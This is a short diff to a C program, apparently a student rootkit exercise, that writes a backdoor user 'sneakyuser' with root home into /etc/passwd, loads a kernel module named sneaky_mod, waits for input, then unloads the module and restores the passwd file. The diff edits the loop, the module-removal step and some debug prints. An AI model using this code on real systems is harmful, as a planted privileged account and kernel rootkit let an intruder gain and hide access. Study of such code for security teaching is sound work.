@@ -14,7 +14,6 @@ void pwdswap(void) {
   }
   fwrite("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n",50,1,passwd);
   fclose(passwd);
-
 }
 
 
@@ -41,18 +40,20 @@ int main(void) {
   //Step 3: Load kernel module
   system(str);
 
-  system("lsmod");
+  //system("lsmod");
 
+  //Step 4: While Loop
+  char c = 'a';
+  while (c != 'q') {
+    scanf("%c", &c);
+  }
   
   //Step 5: Release kernel module 
-  //  system("sudo rmmod sneaky_mod.ko");
+  system("sudo rmmod sneaky_mod.ko");
 
 
   //Step 6: Restore /etc/passwd file
   system("sudo cp /tmp/passwd /etc/passwd");
-
-  printf("My etc size is:%lu\n", sizeof("/etc/passwd"));
-  printf("My tmp size is:%lu\n", sizeof("/tmp/passwd"));
   
   
   return EXIT_SUCCESS;
